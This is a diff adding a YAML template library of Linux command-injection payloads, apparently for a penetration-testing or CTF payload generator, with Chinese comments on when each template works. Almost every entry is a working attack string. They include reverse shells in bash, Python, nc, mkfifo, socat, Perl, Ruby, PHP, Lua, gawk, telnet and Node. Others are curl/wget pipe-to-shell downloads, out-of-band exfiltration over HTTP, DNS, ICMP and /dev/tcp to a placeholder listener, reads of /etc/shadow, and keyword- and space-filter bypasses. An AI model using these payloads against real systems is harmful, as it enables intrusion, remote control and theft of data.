@@ -1,0 +1,685 @@
+ruleDB: v0.1.0
+# Linux 命令注入模板。content_type 用 shell-command（无可靠 parser，见方案 §10.2）。
+
+templates:
+  # ---- 分隔符 ----
+
+  - id: rce.linux.cmd.raw
+    name: Linux 裸命令
+    desc: 不加任何分隔符，仅命令本体。用于外面已有包裹、或要叠 join 绕过的场景
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    body: "<<cmd>>"
+    vars: [cmd]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.linux.sep.basic
+    name: Linux 命令分隔基础
+    desc: 用分隔符接在已有命令之后
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "||", "&", "&&"], default: ";"}
+    body: "<<sep>><<cmd>>"
+    vars: [cmd]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.linux.sep.newline
+    name: Linux 换行分隔
+    desc: 分隔符被过滤时用换行，URL 中写 %0a
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      nl: {options: ["%0a", "%0d%0a", "\n"], default: "%0a"}
+    body: "<<nl>><<cmd>>"
+    vars: [cmd]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 命令替换 ----
+
+  - id: rce.linux.subst.dollar
+    name: Linux $() 命令替换
+    desc: 命令替换，回显在原本的输出位置
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    body: "$(<<cmd>>)"
+    vars: [cmd]
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.linux.subst.backtick
+    name: Linux 反引号命令替换
+    desc: $() 被过滤时的替代
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    body: "`<<cmd>>`"
+    vars: [cmd]
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 空格绕过 ----
+
+  - id: rce.linux.space.ifs
+    name: Linux 空格用 $IFS 替代
+    desc: 空格被过滤时用 $IFS 或 ${IFS}
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      ifs: {options: ["$IFS", "${IFS}", "%09", "$IFS$9"], default: "$IFS"}
+      # 原来把 /etc/passwd 写死在 body 里。这条模板的卖点是**空格怎么绕**，
+      # 读哪个文件是另一回事——CTF 里要读的多半是 /flag。
+      target:
+        options: ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ",
+                  "/flag", "/flag.txt", "/var/www/html/index.php"]
+        default: "/etc/passwd"
+    body: "<<sep>>cat<<ifs>><<target>>"
+    vars: []
+    requires: [weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 盲注 ----
+
+  - id: rce.linux.blind.time
+    name: Linux 时间盲注
+    desc: 无回显时用延时判断
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      secs: {options: ["3", "5", "10"], default: "5"}
+    body: "<<sep>>sleep <<secs>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.linux.blind.oob
+    name: Linux 带外回显
+    desc: 把命令输出编码后发到外部监听
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      # `-w0` 是不换行的关键：默认 base64 每 76 字符插一个换行，
+      # 拼进 URL 会把路径截断，接收端也解不回来。这条模板把编码方式摊开给你选。
+      enc: {options: ["base64 -w0", "base64 | tr -d '\\n'", "xxd -p | tr -d '\\n'"],
+            default: "base64 -w0"}
+    body: "<<sep>>curl http://<<lhost>>/$(<<cmd>> | <<enc>>)"
+    vars: [cmd, lhost]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 反弹 Shell ----
+  # 注意：lhost / lport 故意没有默认值，未填时保持 <<lhost>> 字面量。
+  # 这样用户没填就会得到一个明显不可用的串，而不是指向某个真实地址的串。
+
+  - id: rce.linux.reverse.bash
+    name: Bash 反弹 Shell
+    desc: 目标上有 bash 且它编译时带了 /dev/tcp 时最省事，不依赖任何外部命令。Alpine 这类只有 busybox ash 的目标不认 /dev/tcp，换 nc 或 python 那条
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>bash -i >& /dev/tcp/<<lhost>>/<<lport>> 0>&1"
+    vars: [lhost, lport]
+    requires: [outbound, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.python
+    name: Python 反弹 Shell
+    desc: 侦察确认目标装了 python3 时用。这条载荷最长、引号嵌套最多，过 WAF 比 bash 那条费劲；只有 python2 的目标要把命令里的 python3 改成 python
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<<lhost>>\",<<lport>>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.nc
+    name: nc 反弹 Shell
+    desc: 目标上的 nc 带 -e 时用（busybox 和 GNU netcat 有，Debian 的 netcat-openbsd 没有）。目标那个 nc 没有 -e 就换 mkfifo 那条
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>nc -e /bin/sh <<lhost>> <<lport>>"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 下载执行 ----
+
+  - id: rce.linux.download.curl
+    name: curl 下载并执行
+    desc: 目标上有 curl 时用，脚本拉下来直接喂给 sh，不在目标上落文件。没有 curl 就换 wget 或 python 那条
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>curl -s http://<<lhost>>/<<file>> | sh"
+    vars: [lhost, file]
+    requires: [outbound, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.download.wget
+    name: wget 下载并执行
+    desc: 目标上有 wget 时用：-qO- 把内容直接打到 stdout 再接管道，不落盘。它和 curl 那条只差下载器，看目标装了哪个
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>wget -qO- http://<<lhost>>/<<file>> | sh"
+    vars: [lhost, file]
+    requires: [outbound, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.download.python
+    name: Python 下载并执行
+    desc: 目标上没有 curl 也没有 wget 时的兜底，只要装了 Python 就能拉
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://<<lhost>>/<<file>>').read())\""
+    vars: [lhost, file]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 编码后执行 ----
+  # 命令本体被关键字过滤挡掉时，把命令先编码再让 shell 解回来：
+  # 过滤看到的是 base64/hex 串，认不出里面是什么。
+
+  - id: rce.linux.cmd.base64
+    name: Base64 编码执行
+    desc: 命令里有被过滤的字眼时用。注意 base64 串本身可能含 + / =，放在 URL 里要再编码一次
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      dec: {options: ["base64 -d", "base64 --decode", "openssl base64 -d"],
+            default: "base64 -d"}
+    body: "<<sep>>echo <<b64>> | <<dec>> | bash"
+    vars: [b64]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.cmd.hex
+    name: Hex 编码执行
+    desc: 同 base64，但只有 0-9a-f，不招 URL 编码的麻烦
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>echo <<hex>> | xxd -r -p | bash"
+    vars: [hex]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 无条件 / 无 HTTP 出网时的盲打 ----
+
+  - id: rce.linux.blind.file
+    name: Linux 无回显写文件
+    desc: 命令有输出但页面不给回显时，把结果写进 Web 目录再直接请求那个文件
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>><<cmd>> > <<filepath>>"
+    vars: [cmd, filepath]
+    requires: [writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.blind.oob.dns
+    name: Linux DNS 带外
+    desc: 连 HTTP 出网都被拦时，DNS 往往还通。把命令输出拼进域名去解析，收到 DNS 日志即可
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      tool: {options: ["nslookup", "dig", "host", "getent hosts"], default: "nslookup"}
+    body: "<<sep>><<tool>> $(<<cmd>> | base64 -w0).<<domain>>"
+    vars: [cmd, domain]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 反弹 Shell 的备用写法 ----
+  # 目标上没有 python / nc -e 被去掉时，用命名管道把 stdin 接回去。
+
+  - id: rce.linux.reverse.mkfifo
+    name: 命名管道反弹 Shell
+    desc: nc 没有 -e 选项时的经典替代，靠 mkfifo 把两个方向接起来
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      f:   {options: ["/tmp/f", "/dev/shm/f", "/var/tmp/f"], default: "/tmp/f"}
+    body: "<<sep>>rm -f <<f>>;mkfifo <<f>>;cat <<f>>|/bin/sh -i 2>&1|nc <<lhost>> <<lport>> ><<f>>"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.socat
+    name: socat 反弹 Shell
+    desc: socat 能直接分配 pty，拿到的 shell 比 nc 的体验好得多
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>socat tcp-connect:<<lhost>>:<<lport>> exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 反弹 Shell：解释器更多的那一档 ----
+  # 上面 bash/python/nc/mkfifo/socat 五条覆盖了最常见的目标。下面这几条是
+  # 「目标上只有这个解释器」时的补充：老系统（perl/ruby/php）、最小容器（lua/node）、
+  # 以及 nc 和 python 都被删掉的场景（awk/telnet）。
+  # 语言类反弹的共同形状是「建 socket → 把 fd 0/1/2 指过去 → exec 一个 shell」，
+  # 差别只在语法。**都要求 lhost 上已经起好监听**，所以 requires 一律带 listener。
+
+  - id: rce.linux.reverse.perl_tcp
+    name: Perl 反弹 Shell
+    desc: 目标上只有 perl 时用（老系统、只带最小 Perl 的容器）。它只用核心模块 Socket，不依赖 IO::Socket，所以比大多数语言版都便携；代价是载荷最长、引号层数最多，过基于正则的 WAF 最费劲
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      sh:  {options: ["/bin/sh", "/bin/bash", "/bin/ash", "/bin/dash"], default: "/bin/sh"}
+    body: |-
+      <<sep>>perl -e 'use Socket;$i="<<lhost>>";$p=<<lport>>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<<sh>> -i");};'
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.ruby_socket
+    name: Ruby 反弹 Shell
+    desc: 目标上有 ruby（Rails 服务器、Chef/Puppet 节点）时用。`-rsocket` 直接把 socket 库 require 进来，靠 `TCPSocket.open(...).to_i` 拿到 fd 号再 `exec sprintf` 把三根标准流指过去——比 fork 那一版短，也不会留下一个多余的子进程
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: |-
+      <<sep>>ruby -rsocket -e 'f=TCPSocket.open("<<lhost>>",<<lport>>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.php
+    name: PHP 反弹 Shell
+    desc: 目标上命令行 php 可用时（PHP 应用服务器、装了 php-cli 的镜像）用它。只要一行，比 php -r 的其他写法都短；`<&3` 里的 3 是 fsockopen 分配到的 fd 号，目标上若已被占用（比如 open_basedir 之外的 fd 被先用了）要改成实际编号
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: |-
+      <<sep>>php -r '$sock=fsockopen("<<lhost>>",<<lport>>);exec("/bin/sh -i <&3 >&3 2>&3");'
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.lua
+    name: Lua 反弹 Shell
+    desc: 目标上有 lua（OpenResty 网关、游戏服务端、嵌入式设备）时用。**前提是装了 luasocket**（`require("socket")` 能过）——只有裸 lua 解释器时不成立，先用一条 `lua -e "print(require('socket'))"` 确认
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: |-
+      <<sep>>lua -e "require('socket');require('os');t=socket.tcp();t:connect('<<lhost>>','<<lport>>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.awk
+    name: Gawk 反弹 Shell
+    desc: nc、python、perl 全被删干净、只剩一个 awk 时的兜底。用的是 **gawk 特有**的 `/inet/tcp/0/host/port` 伪文件（mawk 和 busybox awk 都不认，Debian 上 `awk` 默认是 mawk 就废了——先 `awk --version` 确认是 GNU Awk）。它不 exec 新 shell，而是把收到的每一行当命令跑，所以拿到的不是交互式 TTY，Ctrl-C 也传不过去
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: |-
+      <<sep>>awk 'BEGIN{s="/inet/tcp/0/<<lhost>>/<<lport>>";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.telnet
+    name: Telnet 反弹 Shell
+    desc: nc 和 python 都没有、但 telnet 客户端还在时的最后选择。和 mkfifo 那条只差最后的连接程序。**成功率明显更低**：多数 telnet 客户端在 stdin 不是 TTY 时不做双向转发或直接退出，拿到的经常是「能连上但敲不进命令」。优先试 nc / mkfifo / socat，都不行再退到这条
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      f:   {options: ["/tmp/f", "/dev/shm/f", "/var/tmp/f"], default: "/tmp/f"}
+    body: "<<sep>>rm -f <<f>>;mkfifo <<f>>;cat <<f>>|/bin/sh -i 2>&1|telnet <<lhost>> <<lport>> ><<f>>"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.reverse.node
+    name: Node.js 反弹 Shell
+    desc: 目标跑着 Node 服务（webpack dev server、Electron 应用、SSR 前端）时用。用 `child_process.spawn` 起 shell 再把三根流 pipe 到 socket，比 `exec('bash -i >& /dev/tcp/...')` 那种写法通用——不依赖目标有 bash
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: |-
+      <<sep>>node -e "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(<<lport>>,'<<lhost>>',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()"
+    vars: [lhost, lport]
+    requires: [outbound, listener, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 关键字被过滤时：把命令名本身拆开 ----
+  # 这三条针对的是「命令名整词进了黑名单」这一类过滤（`cat`、`ls`、`id` 被拦），
+  # 和上面 base64/hex 那两条的区别是：**载荷里仍然能看出意图**，
+  # 但没有任何一个连续片段等于被拦的那个词。
+
+  - id: rce.linux.bypass.glob
+    name: 通配符拆命令名
+    desc: 命令名本身被关键字过滤挡掉时（`cat`、`ls` 进了黑名单）用通配符把命令拼回来——shell 会把 `?` 展开成匹配到的文件名。**成败取决于两件事**：过滤必须只匹配字面命令名；被匹配的目录项必须真的等长——`/???/??t` 要求 `/bin/cat`（3 字母目录 + 3 字母命令），换成 `/usr/bin/cat` 这条就不成立，得改成 `/???/???/??t`
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      form:
+        options:
+          - {id: cat_passwd, name: "cat /etc/passwd（/???/??t /???/p??s??）", raw: "/???/??t /???/p??s??"}
+          - {id: cat_shadow, name: "cat /etc/shadow",                         raw: "/???/??t /???/s?????"}
+          - {id: cat_hosts,  name: "cat /etc/hosts",                          raw: "/???/??t /???/h????"}
+          - {id: cat_flag,   name: "cat /flag.txt",                           raw: "/???/??t /????.txt"}
+          - {id: id,         name: "id",                                      raw: "/???/id"}
+          - {id: ls_root,    name: "ls /",                                    raw: "/???/l? /"}
+        default: cat_passwd
+    body: "<<sep>><<form.raw>>"
+    vars: []
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.bypass.keyword.quote
+    name: 引号穿插拆命令名
+    desc: 同样针对命令名黑名单，但换个思路：把命令名中间插一个空引号（`c'a't`）或转义一个字符（`c\at`）——shell 解析时引号被剥掉，真正执行的还是 `cat`，而过滤看到的字符串里没有连续的 `cat`。比通配符更可靠（不依赖目录里文件名的长度），代价是**骗不过「先去掉引号再匹配」的过滤**，那种过滤只能靠下面的变量拼接绕
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      form:
+        options:
+          - {id: single,      name: "单引号穿插 c'a't",        seq: "c'a't"}
+          - {id: double,      name: "双引号穿插 c\"a\"t",      seq: 'c"a"t'}
+          - {id: backslash,   name: "反斜杠转义 c\\at",        seq: "c\\at"}
+          - {id: dollar_at,   name: "$@ 展开为空 c$@at",       seq: "c$@at"}
+          - {id: dollar_star, name: "$* 展开为空 c$*at",       seq: "c$*at"}
+        default: single
+      ifs: {options: [" ", "$IFS", "${IFS}", "%09"], default: " "}
+      target:
+        options: ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/flag", "/flag.txt"]
+        default: "/etc/passwd"
+    body: "<<sep>><<form.seq>><<ifs>><<target>>"
+    vars: []
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.bypass.keyword.var
+    name: 变量拼接拆命令名
+    desc: 命令名被整词匹配、且过滤会先剥引号再匹配时用——把命令名切成两段分别赋值再拼起来执行，载荷里从头到尾没有出现过 `cat` 这个连续串。**命令名必须是 2 段以上才切得开**（`id` 这种两字母的切完就剩单字符，没意义），所以这条适合 cat / base64 / wget 这类长一点的命令名
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      ifs: {options: [" ", "$IFS", "${IFS}", "%09"], default: " "}
+      target:
+        options: ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/flag", "/flag.txt"]
+        default: "/etc/passwd"
+    body: "<<sep>>a=c;b=at;$a$b<<ifs>><<target>>"
+    vars: []
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 空格被过滤时的组合写法 ----
+
+  - id: rce.linux.bypass.ifs.bash
+    name: $IFS 拼 bash -c
+    desc: 空格被过滤、但 `$IFS` 没被拦时用：把 `bash -c 'cmd'` 里**所有**空格都换成 `${IFS}`，整条载荷不含一个空格字符。`${IFS}` 不加引号时会做词分割，所以正好当一个空格用；`-c` 的参数用**单引号**包着，命令体内自带的空格落在引号内部，不受影响。目标 shell 是 dash/busybox ash 时 `${IFS}` 同样有效，不用改
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      sh:  {options: ["bash", "sh", "dash", "busybox sh"], default: "bash"}
+      ifs: {options: ["$IFS", "${IFS}", "%09", "$IFS$9"], default: "${IFS}"}
+    body: "<<sep>><<sh>><<ifs>>-c<<ifs>>'<<cmd>>'"
+    vars: []
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.subst.herestring
+    name: herestring 喂给解释器
+    desc: 空格被完全过滤、连 `$IFS` 也一起被拦时用：`<<<` 是 herestring，把一个字符串直接接到解释器的 stdin，整个写法不需要空格。**只有 bash / zsh / ksh 认 `<<<`**，`sh`（dash）和 POSIX 模式下的 bash 都不认——先确认目标 shell 再用
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      sh:  {options: ["bash", "zsh", "ksh"], default: "bash"}
+    body: "<<sep>><<sh>><<<'<<cmd>>'"
+    vars: []
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 无回显：不依赖外部下载器的带外通道 ----
+
+  - id: rce.linux.blind.devtcp
+    name: /dev/tcp 带外
+    desc: 目标上 curl / wget / nc 都被删掉、也没有可写 Web 目录时用：把命令输出直接重定向到 bash 内建的 `/dev/tcp` 伪设备，一条 TCP 连接就把数据送出去了，不依赖目标上任何外部程序。**只有 bash 和 ksh 认 `/dev/tcp`**，dash / busybox ash 不认。接收端 `nc -lvnp <lport>` 即可
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>><<cmd>> > /dev/tcp/<<lhost>>/<<lport>>"
+    vars: [lhost, lport]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.blind.icmp
+    name: ICMP 带外
+    desc: HTTP、DNS 都被拦、只剩 ICMP 能出去时用。把命令输出转成十六进制塞进 ICMP 的 padding 字段——**lhost 上要开抓包**（`tcpdump -i any -n icmp -X`）才看得到内容，普通 nc 监听收不到。两个注意点：`ping -p` 在部分发行版上需要 root 或 cap_net_raw；`xxd` 不在时换成 `od -An -tx1|tr -d ' \n'`
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+    body: "<<sep>>ping -c 1 -p $(<<cmd>>|xxd -p|head -c 32) <<domain>>"
+    vars: [cmd, domain]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.linux.blind.oob.post
+    name: HTTP POST 带外
+    desc: 命令输出很长、放进 GET 的 URL 会被长度限制截断、或者不想让数据出现在代理日志的路径里时用。它和 `rce.linux.blind.oob` 只有一处区别——数据放在**请求体**而不是路径。**接收端要能收 POST 体**：`python3 -m http.server` 只记路径不记体，得用 `nc -lvnp <lport>` 看原始报文或自己写几行 Flask
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: [";", "|", "&&"], default: ";"}
+      enc: {options: ["base64 -w0", "xxd -p | tr -d '\\n'"], default: "base64 -w0"}
+    body: |-
+      <<sep>>curl -s -X POST --data "$(<<cmd>> | <<enc>>)" http://<<lhost>>/
+    vars: [cmd, lhost]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
